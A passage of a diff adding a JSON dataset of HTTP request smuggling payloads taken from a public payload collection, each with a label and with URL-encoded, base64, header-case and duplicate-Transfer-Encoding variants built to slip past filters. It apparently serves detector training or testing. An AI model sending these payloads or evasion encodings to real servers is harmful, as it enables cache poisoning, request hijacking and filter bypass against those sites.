+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b81f93ad56f7e537b83aa9f15ef40a903b452394608c2059493936b83c391950",
+    "original_id": "raw_hsmug_00007",
+    "original_payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0",
+    "obfuscated_payload": "POST%2520%252F%2520HTTP%252F1.1%250AHost%253A%2520vulnerable-website.com%250AContent-Length%253A%25203%250ATransfer-Encoding%253A%2520chunked%250A%250A8%250ASMUGGLED%250A0",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 62762995,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00007__obf02",
+    "payload": "UE9TVCAvIEhUVFAvMS4xCkhvc3Q6IHZ1bG5lcmFibGUtd2Vic2l0ZS5jb20KQ29udGVudC1MZW5ndGg6IDMKVHJhbnNmZXItRW5jb2Rpbmc6IGNodW5rZWQKCjgKU01VR0dMRUQKMA==",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b81f93ad56f7e537b83aa9f15ef40a903b452394608c2059493936b83c391950",
+    "original_id": "raw_hsmug_00007",
+    "original_payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0",
+    "obfuscated_payload": "UE9TVCAvIEhUVFAvMS4xCkhvc3Q6IHZ1bG5lcmFibGUtd2Vic2l0ZS5jb20KQ29udGVudC1MZW5ndGg6IDMKVHJhbnNmZXItRW5jb2Rpbmc6IGNodW5rZWQKCjgKU01VR0dMRUQKMA==",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 62764004,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00007__obf03",
+    "payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 3\nTransfer-Encoding : chunked\nTransfer-Encoding: identity\r\n\n8\nSMUGGLED\n0",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b81f93ad56f7e537b83aa9f15ef40a903b452394608c2059493936b83c391950",
+    "original_id": "raw_hsmug_00007",
+    "original_payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0",
+    "obfuscated_payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 3\nTransfer-Encoding : chunked\nTransfer-Encoding: identity\r\n\n8\nSMUGGLED\n0",
+    "obfuscation_chain": [
+      "hsmug_duplicate_te",
+      "hsmug_te_space_before_colon"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 62765013,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_hsmug_00007__obf04",
+    "payload": "POST%2520%252F%2520HTTP%252F1.1%250AHost%253A%2520vulnerable-website.com%250AContent-Length%253A%25203%250ATransfer-Encoding%253A%2520chunked%250ATransfer-Encoding%253A%2520identity%250D%250A%250A8%250ASMUGGLED%250A0",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b81f93ad56f7e537b83aa9f15ef40a903b452394608c2059493936b83c391950",
+    "original_id": "raw_hsmug_00007",
+    "original_payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0",
+    "obfuscated_payload": "POST%2520%252F%2520HTTP%252F1.1%250AHost%253A%2520vulnerable-website.com%250AContent-Length%253A%25203%250ATransfer-Encoding%253A%2520chunked%250ATransfer-Encoding%253A%2520identity%250D%250A%250A8%250ASMUGGLED%250A0",
+    "obfuscation_chain": [
+      "hsmug_duplicate_te",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 62766022,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00008__obf01",
+    "payload": "Content-Length%3A%203",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "68e2191717e61a32eeb1ad0da29cbdfdabd1f67b2f466b6f6922eec269e04e49",
+    "original_id": "raw_hsmug_00008",
+    "original_payload": "Content-Length: 3",
+    "obfuscated_payload": "Content-Length%3A%203",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 62862998,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00008__obf02",
+    "payload": "Q29udGVudC1MZW5ndGg6IDM=",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "68e2191717e61a32eeb1ad0da29cbdfdabd1f67b2f466b6f6922eec269e04e49",
+    "original_id": "raw_hsmug_00008",
+    "original_payload": "Content-Length: 3",
+    "obfuscated_payload": "Q29udGVudC1MZW5ndGg6IDM=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 62864007,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00008__obf03",
+    "payload": "ConteNT-LENgTH: 3",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "68e2191717e61a32eeb1ad0da29cbdfdabd1f67b2f466b6f6922eec269e04e49",
+    "original_id": "raw_hsmug_00008",
+    "original_payload": "Content-Length: 3",
+    "obfuscated_payload": "ConteNT-LENgTH: 3",
+    "obfuscation_chain": [
+      "header_case"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 62865016,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_hsmug_00008__obf04",
+    "payload": "%43onte%6Et-%4Cength: 3",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "68e2191717e61a32eeb1ad0da29cbdfdabd1f67b2f466b6f6922eec269e04e49",
+    "original_id": "raw_hsmug_00008",
+    "original_payload": "Content-Length: 3",
+    "obfuscated_payload": "%43onte%6Et-%4Cength: 3",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 62866025,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00009__obf01",
+    "payload": "%50OST / HTTP/1.%31\nHos%74: %64o%6D%61in%2E%65xa%6Dple%2Eco%6D\nUser-Agent: %4Dozill%61/5.0 (X11; L%69%6Eux x86_64) AppleWeb%4Bit/53%37.3%36 (KHTM%4C, like Gecko) Chrome/73.0.3683.86\nCon%74ent%2DLengt%68: 4\n%43o%6E%6E%65ction: close\nC%6Fntent-Typ%65: applic%61tion/x-w%77w-f%6Frm-urlenc%6Fded\nAccep%74-Encoding: %67zip, defl%61te\n\n5c\nGPOST / HTTP/1.1\nContent-Ty%70e: ap%70lication/%78-www-for%6D-%75rle%6Ecod%65d\nCo%6Etent%2DLeng%74h: 15\nx=1\n%30",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "394a176354e5820c5ad72a732cae2512be9aa2b32fe741d428a4876f6a92e76b",
+    "original_id": "raw_hsmug_00009",
+    "original_payload": "POST / HTTP/1.1\nHost: domain.example.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86\nContent-Length: 4\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\nx=1\n0",
+    "obfuscated_payload": "%50OST / HTTP/1.%31\nHos%74: %64o%6D%61in%2E%65xa%6Dple%2Eco%6D\nUser-Agent: %4Dozill%61/5.0 (X11; L%69%6Eux x86_64) AppleWeb%4Bit/53%37.3%36 (KHTM%4C, like Gecko) Chrome/73.0.3683.86\nCon%74ent%2DLengt%68: 4\n%43o%6E%6E%65ction: close\nC%6Fntent-Typ%65: applic%61tion/x-w%77w-f%6Frm-urlenc%6Fded\nAccep%74-Encoding: %67zip, defl%61te\n\n5c\nGPOST / HTTP/1.1\nContent-Ty%70e: ap%70lication/%78-www-for%6D-%75rle%6Ecod%65d\nCo%6Etent%2DLeng%74h: 15\nx=1\n%30",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 62963001,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00009__obf02",
+    "payload": "UE9TVCAvIEhUVFAvMS4xCkhvc3Q6IGRvbWFpbi5leGFtcGxlLmNvbQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83My4wLjM2ODMuODYKQ29udGVudC1MZW5ndGg6IDQKQ29ubmVjdGlvbjogY2xvc2UKQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQKQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlCgo1YwpHUE9TVCAvIEhUVFAvMS4xCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkCkNvbnRlbnQtTGVuZ3RoOiAxNQp4PTEKMA==",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "394a176354e5820c5ad72a732cae2512be9aa2b32fe741d428a4876f6a92e76b",
+    "original_id": "raw_hsmug_00009",
+    "original_payload": "POST / HTTP/1.1\nHost: domain.example.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86\nContent-Length: 4\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\nx=1\n0",
+    "obfuscated_payload": "UE9TVCAvIEhUVFAvMS4xCkhvc3Q6IGRvbWFpbi5leGFtcGxlLmNvbQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83My4wLjM2ODMuODYKQ29udGVudC1MZW5ndGg6IDQKQ29ubmVjdGlvbjogY2xvc2UKQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQKQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlCgo1YwpHUE9TVCAvIEhUVFAvMS4xCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkCkNvbnRlbnQtTGVuZ3RoOiAxNQp4PTEKMA==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 62964010,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00009__obf03",
+    "payload": "POST / HTTP/1.1\nHoSt: domain.example.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86\ncONTenT-LeNgTh: 4\nConnection: close\nCOntent-tYpE: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\n\n5c\nGPOST / HTTP/1.1\nCOnTEnT-TyPE: application/x-www-form-urlencoded\ncoNTENT-leNGtH: 15\nx=1\n0",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "394a176354e5820c5ad72a732cae2512be9aa2b32fe741d428a4876f6a92e76b",
+    "original_id": "raw_hsmug_00009",
+    "original_payload": "POST / HTTP/1.1\nHost: domain.example.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86\nContent-Length: 4\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\nx=1\n0",
+    "obfuscated_payload": "POST / HTTP/1.1\nHoSt: domain.example.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86\ncONTenT-LeNgTh: 4\nConnection: close\nCOntent-tYpE: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\n\n5c\nGPOST / HTTP/1.1\nCOnTEnT-TyPE: application/x-www-form-urlencoded\ncoNTENT-leNGtH: 15\nx=1\n0",
+    "obfuscation_chain": [
+      "header_case"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 62965019,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_hsmug_00009__obf04",
+    "payload": "UE9TVCAvIEhUVFAvMS4xCkhvc1Q6IGRvbWFpbi5leGFtcGxlLmNvbQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83My4wLjM2ODMuODYKQ09uVGVOVC1sZU5HdGg6IDQKQ29ubmVjdGlvbjogY2xvc2UKY09OdGVOdC10eVBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQKQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlCgo1YwpHUE9TVCAvIEhUVFAvMS4xCmNvTnRFblQtdFlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkCkNvTlRlTlQtbGVOR1RoOiAxNQp4PTEKMA",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "394a176354e5820c5ad72a732cae2512be9aa2b32fe741d428a4876f6a92e76b",
+    "original_id": "raw_hsmug_00009",
+    "original_payload": "POST / HTTP/1.1\nHost: domain.example.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86\nContent-Length: 4\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\nx=1\n0",
+    "obfuscated_payload": "UE9TVCAvIEhUVFAvMS4xCkhvc1Q6IGRvbWFpbi5leGFtcGxlLmNvbQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83My4wLjM2ODMuODYKQ09uVGVOVC1sZU5HdGg6IDQKQ29ubmVjdGlvbjogY2xvc2UKY09OdGVOdC10eVBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQKQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlCgo1YwpHUE9TVCAvIEhUVFAvMS4xCmNvTnRFblQtdFlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkCkNvTlRlTlQtbGVOR1RoOiAxNQp4PTEKMA",
+    "obfuscation_chain": [
+      "header_case",
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 62966028,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00010__obf01",
+    "payload": "Content-%4Cength: 4",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "99d7be023b0065c5deac2cc4a12400ab806e9d4514cb71e7f70738b0d9b44748",
+    "original_id": "raw_hsmug_00010",
+    "original_payload": "Content-Length: 4",
+    "obfuscated_payload": "Content-%4Cength: 4",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 63063004,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00010__obf02",
+    "payload": "Q29udGVudC1MZW5ndGg6IDQ=",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "99d7be023b0065c5deac2cc4a12400ab806e9d4514cb71e7f70738b0d9b44748",
+    "original_id": "raw_hsmug_00010",
+    "original_payload": "Content-Length: 4",
+    "obfuscated_payload": "Q29udGVudC1MZW5ndGg6IDQ=",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 63064013,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00010__obf03",
+    "payload": "COntENT-lENGth: 4",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "99d7be023b0065c5deac2cc4a12400ab806e9d4514cb71e7f70738b0d9b44748",
+    "original_id": "raw_hsmug_00010",
+    "original_payload": "Content-Length: 4",
+    "obfuscated_payload": "COntENT-lENGth: 4",
+    "obfuscation_chain": [
+      "header_case"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 63065022,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_hsmug_00010__obf04",
+    "payload": "ConTeNt-LEnGtH%253A%25204",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "99d7be023b0065c5deac2cc4a12400ab806e9d4514cb71e7f70738b0d9b44748",
+    "original_id": "raw_hsmug_00010",
+    "original_payload": "Content-Length: 4",
+    "obfuscated_payload": "ConTeNt-LEnGtH%253A%25204",
+    "obfuscation_chain": [
+      "header_case",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 63066031,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00011__obf01",
+    "payload": "GP%4FST / HTTP/1.%31",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "abddade2c64b4fbd5ba35a8125ee0ee5e2fc5665205221c94d2d11b3ce91cd3b",
+    "original_id": "raw_hsmug_00011",
+    "original_payload": "GPOST / HTTP/1.1",
+    "obfuscated_payload": "GP%4FST / HTTP/1.%31",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 63163007,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00011__obf02",
+    "payload": "R1BPU1QgLyBIVFRQLzEuMQ==",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "abddade2c64b4fbd5ba35a8125ee0ee5e2fc5665205221c94d2d11b3ce91cd3b",
+    "original_id": "raw_hsmug_00011",
+    "original_payload": "GPOST / HTTP/1.1",
+    "obfuscated_payload": "R1BPU1QgLyBIVFRQLzEuMQ==",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 63164016,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00011__obf03",
+    "payload": "GPOST \\u002f HTTP\\u002f1.1",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "abddade2c64b4fbd5ba35a8125ee0ee5e2fc5665205221c94d2d11b3ce91cd3b",
+    "original_id": "raw_hsmug_00011",
+    "original_payload": "GPOST / HTTP/1.1",
+    "obfuscated_payload": "GPOST \\u002f HTTP\\u002f1.1",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 63165025,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00011__obf04",
+    "payload": "GP%4FS%54 / H%54TP/1%2E%31",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "abddade2c64b4fbd5ba35a8125ee0ee5e2fc5665205221c94d2d11b3ce91cd3b",
+    "original_id": "raw_hsmug_00011",
+    "original_payload": "GPOST / HTTP/1.1",
+    "obfuscated_payload": "GP%4FS%54 / H%54TP/1%2E%31",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 63166034,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00012__obf01",
+    "payload": "Content-Length%3A%2015",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "aceac55e5fbbe7c535582181c5c494437b331e7edeca89c09afdabe32fc3b1b8",
+    "original_id": "raw_hsmug_00012",
+    "original_payload": "Content-Length: 15",
+    "obfuscated_payload": "Content-Length%3A%2015",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
